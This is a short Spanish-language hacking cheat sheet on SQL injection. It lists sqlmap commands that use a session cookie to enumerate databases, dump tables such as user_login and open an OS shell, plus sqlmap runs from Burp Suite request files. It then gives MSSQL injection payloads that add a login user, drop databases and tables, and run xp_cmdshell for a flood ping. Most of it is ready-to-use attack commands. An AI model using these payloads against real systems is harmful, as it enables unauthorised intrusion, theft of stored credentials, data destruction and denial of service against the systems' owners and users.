# Inyecciones SQL 

Tags: #Hacking #SQLI #MSSQL #SQLMap #BurpSuite  #Ñ 

## Inyecciones DVWA

```bash 
❯ input | pwd       # Mirar la ruta del directorio actual de trabajo. Pipe sirve para ejecutar un segundo comando si la primer parte es exitosa 
```

## SQLMap 

```bash 
# Kali Tool

Nota:
	1. Se necesita estar dentro con credenciales validas para asi obtener la cookie 
	2. Buscar el campo donde se encuentre el 'id=1' 
	3. Ir al 'Inspector', dar click en 'Console' y colocar '>> document.cookie'

❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" --dbs   # Mostrar las DBs
❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" -D database --tables 
❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" -D database -T user_login --dump

❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" --os-shell  # Obtener un shell 'Y'
	❯ hostname       # Si quieremos tener el 'standar output' dar click en 'Y'
	❯ tasklist 
	❯ help
```

```bash 
# BurpSuite y SQLMap

Nota:
	1. Se puede obtener un archivo de texto con Burpsuite el cual contiene la petición y la Cookie de la sesión
	2. Dar click derecho en la petición y seleccionar 'save item' para guardarlo como un archivo '.txt'

❯ sqlmap -r file.txt --dbs    # Mostrar las DBs
❯ sqlmap -r file.txt -D database --tables 
❯ sqlmap -r file.txt -D database -T users --columns 
❯ sqlmap -r file.txt -D database --dump 
```

## Inyecciones DB MSSQL 

```bash 
❯ input';insert into login values("omar","apple123"); --   # Agregar un usuario por medio de una SQL Blind'
❯ input';CREATE DATABASE mydatabase; --                    # Crear una DB' 
❯ input';DROP DATABASE mydatabase; --                      # Borrar la DB' 
❯ input';DROP TABLE table_name; --                         # Borrar una tabla' 

❯ input';exec master..xp_cmdshell 'ping www.google.com -l 65000 -t';--    # Hacer ping a un host especifico' 
```

